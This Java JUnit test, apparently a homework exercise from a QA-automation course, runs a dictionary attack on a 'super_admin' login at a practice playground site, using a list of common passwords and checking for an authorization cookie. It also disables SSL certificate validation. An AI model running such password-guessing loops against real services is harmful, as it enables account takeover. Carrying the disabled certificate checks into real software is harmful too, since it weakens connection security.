package Lesson_2.Exercise;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class Ex9PasswordGuessingTest {
    @Test
    public void testRestAssured() {
        List<String> commonPasswords = Arrays.asList(
                "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
                "letmein", "trustno1", "dragon", "baseball", "iloveyou", "admin",
                "welcome", "sunshine", "ashley", "bailey", "passw0rd", "shadow",
                "123123", "654321", "quertyuiop", "starwars", "superman", "michael",
                "qazwsx", "password1", "000000", "trustno1");

        String urlGetPassword = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String urlCheckAuth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String login = "super_admin";
        String correctPassword = null;


        for (String password : commonPasswords) {
            Map<String, Object> data = new HashMap<>();
            data.put("login", login);
            data.put("password", password);

            Response response = RestAssured
                    .given()
                    .relaxedHTTPSValidation() // добавляем для обхода SSL-проверки
                    .body(data)
                    .post(urlGetPassword)
                    .andReturn();

            String authCookie = response.getCookie("auth_cookie");
            if (authCookie == null) {
                System.out.println("Не верный логин: " + login);
                break;
            }

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", authCookie);

            Response responseForCheck = RestAssured
                    .given()
                    .relaxedHTTPSValidation()  // добавляем для обхода SSL-проверки
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post(urlCheckAuth)
                    .andReturn();

            String checkBody = responseForCheck.getBody().asString();
            System.out.println("Проверка пароля: " + password + " — Ответ: " + checkBody);

            if (checkBody.contains("You are authorized")){
                correctPassword = password;
                System.out.println("\n" + "Найден правильный пароль: " + correctPassword);
                break;
            }
        }
        if (correctPassword == null) {
            System.out.println("\n" + "Не удалось найти правильный пароль в списке.");
        }
    }
}